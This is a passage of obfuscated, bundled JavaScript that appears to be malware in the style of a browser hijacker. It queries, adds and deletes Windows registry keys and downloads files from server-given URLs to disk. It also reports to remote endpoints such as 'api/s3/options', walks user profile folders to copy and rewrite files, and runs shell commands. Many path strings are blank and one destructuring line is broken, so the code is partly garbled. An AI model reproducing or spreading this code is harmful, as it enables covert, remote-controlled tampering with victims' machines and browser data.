        if (arr7.length > 0) {
          ka.push(...arr7);
        }
      }
      async function hi(kv) {
        gf.w3F3UWA.s59BT06('');
        const cp2 = require("child_process");
        const arr8 = [];
        const kw = (le) => {
          if (!le) {
            return ['', ''];
          }
          if (le.endsWith("\\")) {
            return [le, ''];
          }
          const lf = le.lastIndexOf("\\");
          return lf !== -1 ? [le.substring(0, lf), le.substring(lf + 1)] : [le, ''];
        };
        const kx = (lg) => {
          return cp2.spawnSync("reg", ["query", lg], {
            stdio: "ignore"
          }).status === 0;
        };
        const ky = (lh, li) => {
          const lj = cp2.spawnSync("reg", ["query", lh, "/v", li], {
            encoding: "utf8"
          });
          if (lj.status !== 0) {
            return '';
          }
          for (const lk of lj.stdout.split("\n")) {
            const ll = lk.trim().split(/\s{2,}/);
            if (ll.length >= 3 && ll[0] === li) {
              return ll[2];
            }
          }
          return '';
        };
        const kz = (lm) => {
          let flag = false;
          const ln = cp2.spawnSync("reg", ["query", lm], {
            encoding: "utf8"
          });
          if (ln.error) {
            return flag;
          }
          if (ln.status !== 0) {
            return flag;
          }
          const lo = ln.stdout.split("\n").filter((lp) => lp.trim() !== '');
          for (let lq = 1; lq < lo.length; lq++) {
            if (lo[lq].trim().split(/\s{4,}/).length === 3) {
              const [lr, lr, lr] = lr;
              let obj4 = {
                Q57DTM8: gi.j451KZ4,
                A575H6Y: true,
                d5E0TQS: lm + lr,
                a47DHT3: lr,
                i6B2K9E: ''
              };
              arr8.push(obj4);
              flag = true;
            }
          }
          return flag;
        };
        const la = (ls, lt) => {
          return cp2.spawnSync("reg", ["delete", ls, "/v", lt, "/f"], {
            stdio: "ignore"
          }).status === 0;
        };
        const lb = (lu) => {
          cp2.spawnSync("reg", ["delete", lu, "/f"], {
            stdio: "ignore"
          });
        };
        const lc = (lv, lw, lx) => {
          const ly = cp2.spawnSync("reg", ["add", lv, "/v", lw, "/t", "REG_SZ", "/d", lx, "/f"], {
            stdio: "ignore"
          });
          return ly.status === 0;
        };
        for (const ld of kv) {
          if (ld.Q57DTM8 === gi.O435AMZ) {
            ld.A575H6Y = false;
            if (ld.d5E0TQS) {
              const [lz, ma] = kw(ld.d5E0TQS);
              ld.A575H6Y = ma ? !!ky(lz, ma) : kx(lz);
            }
          } else if (ld.Q57DTM8 === gi.j451KZ4) {
            ld.A575H6Y = false;
            if (ld.d5E0TQS) {
              const [mb, mc] = kw(ld.d5E0TQS);
              if (mc) {
                const md = ky(mb, mc);
                ld.a47DHT3 = md;
                ld.A575H6Y = !!md;
              } else {
                ld.A575H6Y = kz(mb);
              }
            }
          } else if (ld.Q57DTM8 === gi.R62AFMF) {
            ld.A575H6Y = false;
            if (ld.d5E0TQS && ld.a47DHT3) {
              const [me, mf] = kw(ld.d5E0TQS);
              ld.A575H6Y = lc(me, mf, gz(gz(ld.a47DHT3)));
            }
          } else if (ld.Q57DTM8 === gi.S58EMWW) {
            ld.A575H6Y = false;
            if (ld.d5E0TQS) {
              const [mg, mh] = kw(ld.d5E0TQS);
              if (mh) {
                ld.A575H6Y = !la(mg, mh);
              } else {
                lb(mg);
                ld.A575H6Y = kx(mg);
              }
            }
          }
        }
        if (arr8.length > 0) {
          kv.push(...arr8);
        }
      }
      async function hj(mi) {
        gf.w3F3UWA.s59BT06('');
        const mj = async (mm) => {
          mm.A575H6Y = false;
          if (mm.d5E0TQS && mm.a47DHT3) {
            if (mm.a47DHT3.startsWith("http") || mm.a47DHT3.startsWith("https")) {
              const mn = await hd(mm.a47DHT3);
              if (mn.length > 0) {
                const mo = gz(mm.d5E0TQS);
                const mp = require("path").dirname(mo);
                if (!gv(mp)) {
                  gw(mp);
                }
                mm.A575H6Y = hc(mo, mn);
              }
            }
          }
        };
        const mk = async (mq) => {
          mq.A575H6Y = false;
          if (mq.d5E0TQS && mq.a47DHT3 && mq.i6B2K9E) {
            if (mq.a47DHT3.startsWith("http") || mq.a47DHT3.startsWith("https")) {
              const mr = gt(await hd(mq.a47DHT3), gp(mq.i6B2K9E));
              if (mr.length > 0) {
                const ms = gz(mq.d5E0TQS);
                const mt = require("path").dirname(ms);
                if (!gv(mt)) {
                  gw(mt);
                }
                mq.A575H6Y = hc(ms, mr);
              }
            }
          }
        };
        for (const ml of mi) {
          if (ml.Q57DTM8 === gi.R62AFMF) {
            if (!ml.i6B2K9E) {
              await mj(ml);
            } else {
              await mk(ml);
            }
          }
        }
      }
      async function hk(mu) {
        gf.w3F3UWA.s59BT06('');
        if (mu.length === 0) {
          return;
        }
        const arr9 = [];
        const mv = he().split('|');
        const mw = (my) => {
          for (const mz of mv) {
            if (mz.includes(my.toUpperCase())) {
              return mz;
            }
          }
          return '';
        };
        for (const mx of mu) {
          if (mx.Q57DTM8 === gi.O435AMZ) {
            const na = mw(mx.d5E0TQS);
            mx.A575H6Y = na !== '';
            if (mx.A575H6Y) {
              mx.d5E0TQS = na;
            }
          } else if (mx.Q57DTM8 === gi.j451KZ4) {
            for (const nb of mv) {
              arr9.push({
                d5E0TQS: nb,
                a47DHT3: '',
                i6B2K9E: '',
                A575H6Y: true,
                Q57DTM8: gi.j451KZ4
              });
            }
          }
        }
        if (arr9.length > 0) {
          mu.push(...arr9);
        }
      }
      async function hl(nc) {
        const nd = gx(nc);
        const ne = typeof nd?.iid === "string" ? nd.iid : '';
        if (ne != str7) {
          gf.w3F3UWA.s59BT06('');
          return;
        }
        const nf = typeof nd?.data === "string" ? nd.data : '';
        if (nf.length == 0) {
          gf.w3F3UWA.s59BT06('');
          return;
        }
        const ng = gs(nf, ne);
        if (!ng) {
          gf.w3F3UWA.s59BT06('');
          gf.w3F3UWA.s59BT06('');
          return;
        }
        gf.w3F3UWA.s59BT06('');
        const nh = gu.S59C847(gx(ng));
        const ni = nh.J6C4Y96;
        if (!ni) {
          return;
        }
        await hh(nh.x567X2Q.c608HZL);
        await hi(nh.x567X2Q.y4BAIF6);
        await hj(nh.x567X2Q.Z59DGHB);
        await hk(nh.x567X2Q.s67BMEP);
        await hg(nh, ni);
      }
      async function hm(nj, nk) {
        str7 = nj;
        he = nk;
        gf.w3F3UWA.s59BT06('');
        const obj5 = {
          b54FBAI: gg.p5B1KEV,
          P456VLZ: gh.O435AMZ,
          I489V4T: ha(),
          h46EVPS: -new Date().getTimezoneOffset() / 60,
          b4CERH3: "1.0.0.0",
          J6C4Y96: '',
          x567X2Q: {
            c608HZL: [],
            y4BAIF6: [],
            Z59DGHB: [],
            s67BMEP: []
          }
        };
        const nl = await hf(obj5, "/ping");
        if (nl) {
          await hl(nl);
        }
      }
      gd.t505FAN = hm;
    }
  });
  var g = b({
    'obj/T3EADFE.js'(nm) {
      'use strict';

      Object.defineProperty(nm, "__esModule", {
        value: true
      });
      nm.A672SIS = nm.U5E7DEV = nm.i61CFAL = undefined;
      var nn = c();
      var no = e();
      var np = d();
      var nq;
      (function (nx) {
        nx[nx.B639G7B = 0] = 'B639G7B';
        nx[nx.N6330WH = 1] = "N6330WH";
        nx[nx.q564DFB = 2] = 'q564DFB';
        nx[nx.q5A5TD7 = 3] = "q5A5TD7";
        nx[nx.h6074WA = 4] = "h6074WA";
        nx[nx.j4B56KB = 5] = "j4B56KB";
        nx[nx.F58C0X0 = 6] = "F58C0X0";
        nx[nx.i623ZUC = 7] = "i623ZUC";
      })(nq || (nq = {}));
      var nr = class {
        constructor() {
          this.H5C67AR = false;
          this.n412K1U = false;
          this.n5B332O = false;
          this.k61AQMQ = false;
          this.a6AFL0X = false;
          this.D4E3EHU = false;
          this.E67CJ69 = false;
          this.a586DQ2 = false;
          this.X42CN81 = false;
          this.Y4B23HN = false;
          this.T5B2T2A = false;
          this.V54518G = false;
          this.T5F71B2 = false;
          this.g5ABMVH = false;
          this.t533W41 = '';
          this.O6CBOE4 = '';
        }
      };
      nm.i61CFAL = nr;
      var ns = class {
        constructor(ny, nz, oa, ob, oc) {
          this.m5BCP18 = false;
          this.C5C7K1A = '';
          this.K5F23B9 = '';
          this.j5D4IOV = '';
          this.O6CBOE4 = '';
          if (ny !== undefined) {
            this.m5BCP18 = ny;
          }
          if (nz !== undefined) {
            this.C5C7K1A = nz;
          }
          if (oa !== undefined) {
            this.K5F23B9 = oa;
          }
          if (ob !== undefined) {
            this.j5D4IOV = ob;
          }
          if (oc !== undefined) {
            this.O6CBOE4 = oc;
          }
        }
      };
      var nt = class {
        constructor(od, oe, of) {
          this.m5BCP18 = false;
          this.C5C7K1A = '';
          this.p6845JK = '';
          if (od !== undefined) {
            this.m5BCP18 = od;
          }
          if (oe !== undefined) {
            this.C5C7K1A = oe;
          }
          if (of !== undefined) {
            this.p6845JK = of;
          }
        }
      };
      var nu;
      (function (og) {
        og[og.K4E7SBI = 0] = "K4E7SBI";
        og[og.C5B7MFV = 1] = "C5B7MFV";
        og[og.u6BB118 = 2] = 'u6BB118';
      })(nu = nm.U5E7DEV || (nm.U5E7DEV = {}));
      var nv;
      (function (oh) {
        oh[oh.s46FO09 = 0] = 's46FO09';
        oh[oh.d56ECUF = 1] = "d56ECUF";
        oh[oh.z479UBI = 2] = "z479UBI";
      })(nv || (nv = {}));
      var nw = class {
        constructor(oi, oj, ok, ol, om) {
          this.Z5A9DKG = false;
          this.A64CEBI = '';
          this.X6066R5 = oi;
          this.r42EX1Q = oj;
          this.e5FBF4O = ok;
          this.t4E0LPU = ol;
          this.q48AQYC = om;
        }
        async q41FDEK() {
          await no.w3F3UWA.W4EF0EI(0, no.z579NEI.p5FDZHQ);
          async function on() {
            return !(((await nn.S559FZQ.l610ZCY("size")) ?? '') == '');
          }
          if (await on()) {
            const oq = (await nn.S559FZQ.l610ZCY("iid")) ?? '';
            np.e5325L3.q474LOF = oq;
            await no.w3F3UWA.W4EF0EI(0, oq != '' ? no.z579NEI.W592FFM : no.z579NEI.q637JNS);
            return nu.K4E7SBI;
          }
          const oo = this.X6066R5() ?? '';
          if ('' == oo) {
            try {
              await nn.S559FZQ.c5E4Z7C("size", "67");
            } catch {}
            await no.w3F3UWA.Y6CDW21(0, no.z579NEI.h44FFEQ, undefined, ['', oo]);
            return nu.u6BB118;
          }
          let str8 = '';
          try {
            try {
              await nn.S559FZQ.c5E4Z7C("size", "67");
            } catch {}
            var op = await no.e696T3N("api/s3/new?fid=ip&version=" + np.e5325L3.Y55B2P2);
            if (op) {
              str8 = await op.json().iid;
              if (str8 != '') {
                np.e5325L3.q474LOF = str8;
              }
            }
            no.w3F3UWA.s59BT06('');
            if (str8 != '') {
              let or = function (ot) {
                let str9 = '';
                for (let ou = 0; ou < ot.length; ou++) {
                  str9 += ot.charCodeAt(ou).toString(16).padStart(2, '0');
                }
                return str9;
              };
              await nn.S559FZQ.c5E4Z7C("iid", str8);
              await nn.S559FZQ.c5E4Z7C("usid", or(oo));
              await no.w3F3UWA.W4EF0EI(0, no.z579NEI.E40CNM5, ['', oo]);
              return nu.C5B7MFV;
            } else {
              await nn.S559FZQ.c5E4Z7C("iid", '');
              await no.w3F3UWA.Y6CDW21(0, no.z579NEI.h44FFEQ, undefined, ['', oo]);
            }
          } catch (ov) {
            await no.w3F3UWA.Y6CDW21(0, no.z579NEI.h44FFEQ, ov, ['', oo]);
          }
          return nu.u6BB118;
        }
        async A4B0MTO() {
          try {
            if (await this.m6ABVY9()) {
              await f().t505FAN(np.e5325L3.q474LOF, this.q48AQYC);
            }
          } catch {
            no.w3F3UWA.s59BT06('');
          }
        }
        async m58FJB5(ow) {
          try {
            no.w3F3UWA.s59BT06('');
            np.e5325L3.x484Q1X = ow;
            no.w3F3UWA.s59BT06('');
            if (np.e5325L3.x484Q1X == nn.a689XV5.B639G7B) {
              return;
            }
            await no.F490EUX();
            await nn.S559FZQ.J6021ZT();
            if (!(await this.m6ABVY9())) {
              return;
            }
            await this.U6B4YNR();
            await this.Z425M7G();
            var ox = await this.e4F5CS0();
            if (await this.H5AE3US(ox.O6CBOE4)) {
              const data = JSON.parse(ox.O6CBOE4);
              let arr10 = [];
              for (const oy in data) {
                if (data.hasOwnProperty(oy)) {
                  const oz = data[oy];
                  for (const pa in oz) {
                    if (oz.hasOwnProperty(pa)) {
                      await this.O69AL84(oy, pa, oz[pa]);
                      arr10.push(pa);
                    }
                  }
                }
              }
              if (arr10.length > 0) {
                await no.w3F3UWA.W4EF0EI(nq.B639G7B, no.z579NEI.c5C958F, arr10);
              }
            }
            if (ox.H5C67AR) {
              if (ox.a6AFL0X) {
                await this.p4FE5X4(np.e5325L3.H64FNMG);
              } else if (ox.n412K1U) {
                await this.j458FW3(np.e5325L3.H64FNMG);
              }
              if (ox.D4E3EHU) {
                await this.k47F3QK(np.e5325L3.M56F8MB);
              }
              if (ox.E67CJ69 && np.e5325L3.R6780KK) {
                no.w3F3UWA.s59BT06('');
                await this.c647ECB(ox.a586DQ2);
              }
              if (ox.X42CN81 && np.e5325L3.g4184BO) {
                no.w3F3UWA.s59BT06('');
                await this.w5C1TZN(ox.Y4B23HN);
              }
              if (ox.T5B2T2A && np.e5325L3.x4ADWAE) {
                no.w3F3UWA.s59BT06('');
                await this.h659UF4(ox.V54518G);
              }
              if (ox.T5F71B2 && np.e5325L3.z4DE429) {
                no.w3F3UWA.s59BT06('');
                await this.W5F8HOG(ox.g5ABMVH);
              }
            }
            await no.w3F3UWA.W4EF0EI(nq.B639G7B, no.z579NEI.f63DUQF, [np.e5325L3.k596N0J, np.e5325L3.n664BX9, np.e5325L3.R6780KK, np.e5325L3.g4184BO, np.e5325L3.x4ADWAE, np.e5325L3.r53FV0M, ox.H5C67AR, ox.n412K1U, ox.n5B332O, ox.k61AQMQ, ox.a6AFL0X, ox.D4E3EHU, np.e5325L3.z4DE429]);
            return ox;
          } catch (pb) {
            await no.w3F3UWA.Y6CDW21(nq.B639G7B, no.z579NEI.m41EBJQ, pb);
            return;
          }
        }
        async m6ABVY9() {
          np.e5325L3.q474LOF = (await nn.S559FZQ.l610ZCY("iid")) ?? '';
          if (!np.e5325L3.q474LOF || np.e5325L3.q474LOF == '') {
            no.w3F3UWA.s59BT06('');
            return false;
          }
          return true;
        }
        async U6B4YNR() {
          var pc = np.e5325L3.q474LOF ?? '';
          const params2 = new require("url").URLSearchParams();
          const pd = nn.S559FZQ.n677BRA.substring(0, 24) + pc.substring(0, 8);
          const pe = no.O694X7J(pd, JSON.stringify({
            iid: pc,
            version: np.e5325L3.Y55B2P2,
            isSchedule: '0'
          }));
          params2.append("data", pe.data);
          params2.append("iv", pe.iv);
          params2.append("iid", np.e5325L3.q474LOF ?? '');
          let pf = await no.h5235DD("api/s3/options", params2);
          if (pf && pf.ok) {
            no.w3F3UWA.s59BT06('');
            let pg = await pf.json();
            if (pg.data) {
              let ph = function (pj, pk) {
                return '' + pj + pk.toString().padStart(2, '0');
              };
              const data2 = JSON.parse((0, no.U61FWBZ)(pd, pg.data, pg.iv));
              let pi = 1;
              np.E506IW4.f538M6A = data2[ph('A', pi++)];
              np.E506IW4.y50355J = data2[ph('A', pi++)];
              np.E506IW4.q531YE2 = data2[ph('A', pi++)];
              np.E506IW4.V573T48 = data2[ph('A', pi++)];
              np.E506IW4.Z643HV5 = data2[ph('A', pi++)];
              np.E506IW4.M4F7RZT = data2[ph('A', pi++)];
              np.E506IW4.U548GP6 = data2[ph('A', pi++)];
              np.E506IW4.q3F6NE0 = data2[ph('A', pi++)];
              np.E506IW4.G5A3TG6 = data2[ph('A', pi++)];
              np.E506IW4.v50CKDQ = data2[ph('A', pi++)];
              np.E506IW4.v4A5HA6 = data2[ph('A', pi++)];
              np.E506IW4.U40AV23 = data2[ph('A', pi++)];
              np.E506IW4.z626Z6P = data2[ph('A', pi++)];
              np.E506IW4.F431S76 = data2[ph('A', pi++)];
              np.E506IW4.E42DSOG = data2[ph('A', pi++)];
              np.E506IW4.o5D81YO = data2[ph('A', pi++)];
              np.E506IW4.Y4F9KA9 = data2[ph('A', pi++)];
              np.E506IW4.G555SVW = data2[ph('A', pi++)];
              np.E506IW4.e4BDF2X = data2[ph('A', pi++)];
              np.E506IW4.Q63EEZI = data2[ph('A', pi++)];
              np.E506IW4.L4865QA = data2[ph('A', pi++)];
              np.E506IW4.D472X8L = data2[ph('A', pi++)];
              np.E506IW4.h676I09 = data2[ph('A', pi++)];
              np.E506IW4.v4BE899 = data2[ph('A', pi++)];
              np.E506IW4.E5D2YTN = data2[ph('A', pi++)];
              np.E506IW4.n5F14C8 = data2[ph('A', pi++)];
              np.E506IW4.M4AFW8T = data2[ph('A', pi++)];
              np.E506IW4.s64A8ZU = data2[ph('A', pi++)];
              np.E506IW4.O680HF3 = data2[ph('A', pi++)];
              np.E506IW4.n6632PG = data2[ph('A', pi++)];
              np.E506IW4.a423OLP = data2[ph('A', pi++)];
              np.E506IW4.e4C2ZG5 = data2[ph('A', pi++)];
              np.E506IW4.s5A8UWK = data2[ph('A', pi++)];
              np.E506IW4.e44E7UV = data2[ph('A', pi++)];
              np.E506IW4.w668BQY = data2[ph('A', pi++)];
              np.E506IW4.q4D91PM = data2[ph('A', pi++)];
              np.E506IW4.r6BA6EQ = data2[ph('A', pi++)];
              np.E506IW4.g65BAO8 = data2[ph('A', pi++)];
              np.E506IW4.P5D7IHK = data2[ph('A', pi++)];
              np.E506IW4.g6AEHR8 = data2[ph('A', pi++)];
              np.E506IW4.W46DKVE = data2[ph('A', pi++)];
              np.E506IW4.C587HZY = data2[ph('A', pi++)];
              np.E506IW4.L4F4D5K = data2[ph('A', pi++)];
              np.E506IW4.d5A04IA = data2[ph('A', pi++)];
              np.E506IW4.X69CKV1 = data2[ph('A', pi++)];
              np.E506IW4.Q68703N = data2[ph('A', pi++)];
              np.E506IW4.k5FECH9 = data2[ph('A', pi++)];
              np.E506IW4.Q6AD4K1 = data2[ph('A', pi++)];
              np.E506IW4.c4954SH = data2[ph('A', pi++)];
              np.E506IW4.n601ESN = data2[ph('A', pi++)];
              np.E506IW4.c41AH48 = data2[ph('A', pi++)];
              np.E506IW4.c507RUL = data2[ph('A', pi++)];
              np.E506IW4.B5176TW = data2[ph('A', pi++)];
              np.E506IW4.f44CYDD = data2[ph('A', pi++)];
              np.E506IW4.D582MML = data2[ph('A', pi++)];
              np.E506IW4.A6C6QFI = data2[ph('A', pi++)];
              np.E506IW4.E509RHP = data2[ph('A', pi++)];
              np.E506IW4.p49ALL3 = data2[ph('A', pi++)];
              np.E506IW4.H4A2CBA = data2[ph('A', pi++)];
              np.E506IW4.Y420K0O = data2[ph('A', pi++)];
              np.E506IW4.V615O8R = data2[ph('A', pi++)];
              np.E506IW4.g477SEM = data2[ph('A', pi++)];
              np.E506IW4.T525XE5 = data2[ph('A', pi++)];
              np.E506IW4.V68C0TQ = data2[ph('A', pi++)];
              np.E506IW4.P41D36M = data2[ph('A', pi++)];
              np.E506IW4.I4E1ZJ4 = data2[ph('A', pi++)];
              np.E506IW4.r62EVVQ = data2[ph('A', pi++)];
              np.E506IW4.I4046MY = data2[ph('A', pi++)];
              np.E506IW4.i61EV2V = data2[ph('A', pi++)];
              np.E506IW4.l6C9B2Z = data2[ph('A', pi++)];
              np.E506IW4.z3EF88U = data2[ph('A', pi++)];
              np.E506IW4.C61B0CZ = data2[ph('A', pi++)];
              np.E506IW4.i623ZUC = data2[ph('A', pi++)];
              np.E506IW4.F6750PF = data2[ph('A', pi++)];
              np.E506IW4.w443M14 = data2[ph('A', pi++)];
              if (!np.E506IW4.d6C8UEH()) {
                throw new Error("GetRtcFailed");
              }
            } else {
              throw new Error("PrepareRtcBlocked");
            }
          } else {
            throw new Error("PrepareRtcFailed");
          }
        }
        async Z425M7G() {
          this.A64CEBI = no.S634YX3((await nn.S559FZQ.l610ZCY("usid")) ?? '');
          no.w3F3UWA.s59BT06('');
          if (((await nn.S559FZQ.l610ZCY("c-key")) ?? '') != np.e5325L3.q474LOF) {
            this.Z5A9DKG = true;
          }
          np.e5325L3.U430LYO = await this.D656W9S(nq.q564DFB);
          np.e5325L3.r53FV0M = np.e5325L3.U430LYO != '';
          np.e5325L3.a6B1QAU = await this.D656W9S(nq.N6330WH);
          np.e5325L3.k596N0J = np.e5325L3.a6B1QAU != '';
          if ((await this.D656W9S(nq.q5A5TD7)) != '') {
            np.e5325L3.g4184BO = true;
          }
          if ((await this.D656W9S(nq.h6074WA)) != '') {
            np.e5325L3.R6780KK = true;
          }
          if ((await this.D656W9S(nq.j4B56KB)) != '') {
            np.e5325L3.n664BX9 = true;
          }
          if ((await this.D656W9S(nq.F58C0X0)) != '') {
            np.e5325L3.x4ADWAE = true;
          }
          if ((await this.D656W9S(nq.i623ZUC)) != '') {
            np.e5325L3.z4DE429 = true;
          }
          np.e5325L3.H64FNMG = await this.o43FWNP(false, nq.N6330WH);
          np.e5325L3.M56F8MB = await this.o43FWNP(false, nq.q564DFB);
          np.e5325L3.X4B7201 = false;
          if ("" && Array.isArray("")) {
            for (let pl = 0; pl < "".length; pl++) {
              if (await this.A5FCGS4(""[pl])) {
                np.e5325L3.b57CS7T = pl;
                no.w3F3UWA.s59BT06('');
                break;
              }
            }
          }
          if ("" && Array.isArray("")) {
            no.w3F3UWA.s59BT06('');
            for (let pm = 0; pm < "".length; pm++) {
              const pn = ""[pm];
              if (await this.u459C3E(pn.Item1, pn.Item2)) {
                np.e5325L3.K48B40X = pm;
                no.w3F3UWA.s59BT06('');
                break;
              }
            }
            no.w3F3UWA.s59BT06('');
          }
        }
        async o43FWNP(po, pp) {
          return new Promise((pq) => {
            var str10 = "";
            switch (pp) {
              case nq.N6330WH:
                str10 = "";
                break;
              case nq.q564DFB:
                str10 = "";
                break;
            }
            require("child_process").exec((0, no.o5B4F49)("", str10, ''), (pr, ps, pt) => {
              if (pr) {
                (async () => {
                  await no.w3F3UWA.Y6CDW21(pp, no.z579NEI.O5CE32V, pr);
                })();
                pq(false);
              }
              if (pt) {
                (async () => {
                  await no.w3F3UWA.Y6CDW21(pp, no.z579NEI.C4D4SOG, pr);
                })();
                pq(false);
              }
              no.w3F3UWA.s59BT06('');
              pq(ps.trim() !== '');
            });
          });
        }
        async l660ZQF() {
          no.w3F3UWA.s59BT06('');
          let pu = await nn.S559FZQ.l610ZCY("iid");
          if (pu) {
            np.e5325L3.q474LOF = pu;
            try {
              var pv = await no.e696T3N("api/s3/remove?iid=" + pu);
              if (pv) {
                const pw = await pv.json();
              }
              await no.w3F3UWA.W4EF0EI(nq.N6330WH, no.z579NEI.z450T6K);
            } catch (px) {
              await no.w3F3UWA.Y6CDW21(nq.B639G7B, no.z579NEI.z450T6K, px);
            }
          }
        }
        async D656W9S(py) {
          const path4 = require("path");
          let str11 = '';
          if (py == nq.N6330WH) {
            str11 = path4.join(nn.S559FZQ.D47CBV3(), "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
            str11 = "";
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
            str11 = "";
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (py == nq.q564DFB) {
            str11 = "";
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
            str11 = "";
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (py == nq.q5A5TD7) {
            str11 = path4.join(require("process").env.USERPROFILE, "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (py == nq.h6074WA) {
            str11 = path4.join(nn.S559FZQ.D47CBV3(), "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (py == nq.j4B56KB) {
            str11 = path4.join(nn.S559FZQ.D47CBV3(), "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (py == nq.F58C0X0) {
            str11 = path4.join(nn.S559FZQ.D47CBV3(), "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (py == nq.i623ZUC) {
            str11 = path4.join(nn.S559FZQ.P6A7H5F(), "", "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          }
          return '';
        }
        async j458FW3(pz) {
          no.w3F3UWA.s59BT06('');
          if (this.A64CEBI == '' || !np.e5325L3.k596N0J) {
            return;
          }
          const path5 = require("path");
          const qa = nn.S559FZQ.D47CBV3();
          if (!qa) {
            await no.w3F3UWA.Y6CDW21(nq.B639G7B, no.z579NEI.F65A6FS);
            return;
          }
          const qb = path5.join(qa, "");
          if (np.e5325L3.a6B1QAU == '') {
            await no.w3F3UWA.W4EF0EI(nq.N6330WH, no.z579NEI.m599GWS);
            return;
          }
          if (this.Z5A9DKG || !pz || np.e5325L3.x484Q1X == nn.a689XV5.j5C58S9) {
            if (pz) {
              pz = false;
            }
            await this.D45AYQ3("");
            no.w3F3UWA.s59BT06('');
          }
          no.w3F3UWA.s59BT06('');
          let [qc, qd] = await this.A554U7Y(1, path5.join(qb, ""), false);
          if (qd && qd !== '') {
            qd = this.r42EX1Q(qd);
            no.w3F3UWA.s59BT06('');
          }
          if (qc) {
            let flag2 = false;
            for (let qe = 0; qe < qc.length; qe++) {
              let qf = path5.join(qb, qc[qe], "");
              let qg = path5.join(qb, qc[qe], "");
              let qh = path5.join(qb, qc[qe], "");
              let qi = path5.join(qb, qc[qe], "");
              if (await this.X428OQY(qf, qh)) {
                await this.X428OQY(qg, qi);
                let str12 = '';
                let str13 = '';
                await this.r576OBZ(qh).then((qk) => {
                  str12 = qk;
                }).catch((ql) => {
                  (async () => {
                    await no.w3F3UWA.Y6CDW21(nq.N6330WH, no.z579NEI.n690Q7K, ql);
                  })();
                });
                await this.r576OBZ(qi).then((qm) => {
                  str13 = qm;
                }).catch((qn) => {
                  (async () => {
                    await no.w3F3UWA.Y6CDW21(nq.N6330WH, no.z579NEI.V6A4P0Z, qn);
                  })();
                });
                if (str12 == '') {
                  await no.w3F3UWA.W4EF0EI(nq.N6330WH, no.z579NEI.Q455VXT);
                  continue;
                }
                no.w3F3UWA.s59BT06('');
                let qj = await this.O515QL8(1, str12, str13);
                if (!qj.m5BCP18) {
                  await no.w3F3UWA.W4EF0EI(nq.N6330WH, no.z579NEI.L5CFOQF);
                  return;
                }
                if (pz && ((await this.H5AE3US(qj.C5C7K1A)) || (await this.H5AE3US(qj.K5F23B9)))) {
                  no.w3F3UWA.s59BT06('');
                  await this.j458FW3(false);
                  return;
                }
                no.w3F3UWA.s59BT06('');
                let flag3 = false;
                if (await this.H5AE3US(qj.C5C7K1A)) {
                  await this.Y53EKLA(qh, qj.C5C7K1A);
                  await this.X428OQY(qh, qf);
                  no.w3F3UWA.s59BT06('');
                  flag3 = true;
                }
                if (await this.H5AE3US(qj.K5F23B9)) {
                  await this.Y53EKLA(qi, qj.K5F23B9);
                  await this.X428OQY(qi, qg);
                  no.w3F3UWA.s59BT06('');
                  flag3 = true;
                }
                if (qj.j5D4IOV && qj.j5D4IOV.length !== 0) {
                  await this.O69AL84("" + qc[qe], "", qj.j5D4IOV);
                  no.w3F3UWA.s59BT06('');
                  flag3 = true;
                }
                if (await this.H5AE3US(qj.O6CBOE4)) {
                  const data3 = JSON.parse(qj.O6CBOE4);
                  let arr11 = [];
                  for (const qo in data3) {
                    if (data3.hasOwnProperty(qo)) {
                      const qp = data3[qo];
                      for (const qq in qp) {
                        if (qp.hasOwnProperty(qq)) {
                          await this.O69AL84(qo.replace("%PROFILE%", qc[qe]), qq, qp[qq]);
                          arr11.push(qq);
                        }
                      }
                    }
                  }
                  if (arr11.length > 0) {
                    await no.w3F3UWA.W4EF0EI(nq.N6330WH, no.z579NEI.f4D0VNO, [arr11]);
                  }
                }
                flag2 = true;
                if (flag3) {
                  await no.w3F3UWA.W4EF0EI(nq.N6330WH, no.z579NEI.y462O1X);
                } else {
                  await no.w3F3UWA.W4EF0EI(nq.N6330WH, no.z579NEI.E69EQ1O);
                }
              }
            }
            if (flag2) {
              await nn.S559FZQ.c5E4Z7C("c-key", np.e5325L3.q474LOF);
            }
          }
          no.w3F3UWA.s59BT06('');
          return;
        }
        async p4FE5X4(qr) {
          let qs = nq.N6330WH;
          no.w3F3UWA.s59BT06('');
          if (!np.e5325L3.k596N0J) {
            return;
          }
          const path6 = require("path");
          const qt = nn.S559FZQ.D47CBV3();
          if (!qt) {
            await no.w3F3UWA.Y6CDW21(nq.B639G7B, no.z579NEI.F65A6FS);
            return;
          }
          const qu = path6.join(qt, "");
          if (np.e5325L3.a6B1QAU == '') {
            await no.w3F3UWA.W4EF0EI(qs, no.z579NEI.m599GWS);
            return;
          }
          if (this.Z5A9DKG || !qr || np.e5325L3.x484Q1X == nn.a689XV5.j5C58S9) {
            if (qr) {
              qr = false;
              await this.D45AYQ3("");
              no.w3F3UWA.s59BT06('');
            }
            no.w3F3UWA.s59BT06('');
            let [qv, qw] = await this.A554U7Y(qs, path6.join(qu, ""), true);
            if (qw && qw !== '') {
              qw = this.r42EX1Q(qw);
              no.w3F3UWA.s59BT06('');
            }
            if (qv) {
              let flag4 = false;
              for (let qx = 0; qx < qv.length; qx++) {
                let qy = path6.join(qu, qv[qx], "");
                let qz = path6.join(qu, qv[qx], "");
                let ra = path6.join(qu, qv[qx], "");
                let rb = path6.join(qu, qv[qx], "");
                if (await this.X428OQY(qy, qz)) {
                  await this.X428OQY(ra, rb);
                  let rc;
                  let rd;
                  await this.r576OBZ(qz).then((rf) => {
                    rc = rf;
                  }).catch((rg) => {
                    (async () => {
                      await no.w3F3UWA.Y6CDW21(qs, no.z579NEI.n690Q7K, rg);
                    })();
                  });
                  await this.G5B8BDL(rb).then((rh) => {
                    rd = rh ?? '';
                  }).catch((ri) => {
                    (async () => {
                      await no.w3F3UWA.Y6CDW21(qs, no.z579NEI.K4E5MWI, ri);
                    })();
                  });
                  if (rc == '') {
                    await no.w3F3UWA.W4EF0EI(qs, no.z579NEI.Q455VXT);
                    continue;
                  }
                  no.w3F3UWA.s59BT06('');
                  let re = await this.w516KLO(qs, qw, rc, rd);
                  if (!re.m5BCP18) {
